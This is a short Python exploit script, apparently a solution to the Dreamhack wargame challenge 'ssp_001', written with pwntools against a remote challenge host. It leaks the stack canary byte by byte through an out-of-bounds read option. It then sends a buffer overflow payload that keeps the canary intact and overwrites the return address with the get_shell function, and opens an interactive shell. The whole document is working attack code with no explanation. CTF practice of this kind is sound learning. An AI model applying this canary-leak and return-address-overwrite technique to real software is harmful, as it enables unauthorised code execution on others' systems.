from pwn import *

# p = process('./ssp_001')
p = remote('host3.dreamhack.games', 12063)

canary = b''
get_shell = ELF('./ssp_001')
get_shell = get_shell.symbols['get_shell']

for i in range(0x83, 0x7f, -1) :
    p.sendafter('> ', bytes('P', 'utf-8')) #read
    p.sendlineafter(' : ', bytes(str(i),'utf-8')) #scanf
    p.recvuntil(bytes(' : ', 'utf-8'))
    canary += p.recv(2)
    # print(p.recv(2))
canary = int(canary,16)
print('canary : 0x%08x'%canary)

payload = b''
payload += b'\x90' * 0x40
payload += p32(canary)
payload += b'D'*4 #sfp
payload += b'S'*4 #dummy
payload += p32(get_shell) #ret -> get_shell

p.sendafter('> ', bytes('E', 'utf-8'))
p.sendlineafter(' : ', bytes(str(len(payload)), 'utf-8'))
p.sendafter(' : ',payload)
p.interactive()
